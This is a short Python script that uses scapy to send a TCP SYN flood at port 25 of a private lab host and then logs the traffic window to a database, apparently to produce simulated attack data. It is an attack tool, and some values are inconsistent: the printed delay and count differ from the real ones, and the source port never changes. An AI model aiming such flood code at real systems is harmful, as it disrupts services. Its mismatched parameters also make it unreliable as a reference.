from scapy.all import *
from scapy.layers.inet import TCP, IP
import time
import sys
from datetime import datetime
import os
import subprocess
from dbWriteSimulations import Database

src = "192.168.222.1"
tgt = "192.168.222.2"
amount = 1024 + 1000

def dbWriteAsncProcess(startTimePeriod,endTimePeriod,day):
    conn = Database()
    conn.updatePackets10Sec(startTimePeriod,endTimePeriod,day)
    conn.updateFlows(startTimePeriod,endTimePeriod,day)
    conn.closeDbSession()

def timePeriodCalc():
    now = datetime.now()
    current_time = int(now.strftime("%H%M%S"))
    return '{}'.format(current_time - current_time % 10)

def synFlood():

    for sport in range(1024, amount):
        sport = 1024
        L3 = IP(src=src, dst=tgt)
        L4 = TCP(sport=sport, dport=25)
        pkt = L3 / L4
        send(pkt)
        print("Flood!!! targeting: {} SourcePort: {}\n".format(tgt,str(sport)))
        time.sleep(0.7)


print("     \n###  Starting flooding {} s   ###".format(tgt))
print("     ###  Amount: {}   |   Delay: 0.1 ###".format(75))
day = datetime.today().strftime("%A")
startTimePeriod=timePeriodCalc()
synFlood()
endTimePeriod=str(int(timePeriodCalc())+10)
print("     \n###  End of flooding simulation  ###")


try:
    conn = Database()
    conn.updatePackets10Sec(startTimePeriod,endTimePeriod,day)
    conn.updateFlows(startTimePeriod,endTimePeriod,day)
    conn.closeDbSession()
except Exception as e:
    print(e)
